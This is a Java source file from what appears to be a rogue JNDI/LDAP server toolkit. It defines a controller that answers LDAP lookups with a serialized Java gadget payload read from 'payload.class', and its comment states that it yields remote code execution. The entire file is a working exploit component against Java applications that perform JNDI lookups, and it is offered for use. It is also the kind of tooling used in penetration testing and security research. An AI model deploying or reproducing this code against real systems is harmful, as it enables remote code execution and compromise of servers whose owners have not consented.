package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.StringRefAddr;
import java.io.FileInputStream;
import java.io.File;
import java.lang.System;

/**
 * Yields:
 *  RCE via user-provided gadget file ("payload.class").
 *
 * Requires:
 *  A file called "payload.class" in current working directory.
 *  The file should contain serialized Java object.
 *  For example, it can be created with YSOserial.
 *
 * @author putsi
 */
@LdapMapping(uri = { "/o=fromfile" })
public class FromFile implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP result for " + base + " with user-provided gadget file \"payload.class\"");

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        // Load already serialized payload from "./payload.class" file.
        String path = "payload.class";
        File file = new File(path);
        FileInputStream fl = new FileInputStream(path);
        byte[] arr = new byte[(int)file.length()];
        fl.read(arr);
        fl.close();

        e.addAttribute("javaSerializedData", arr);

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
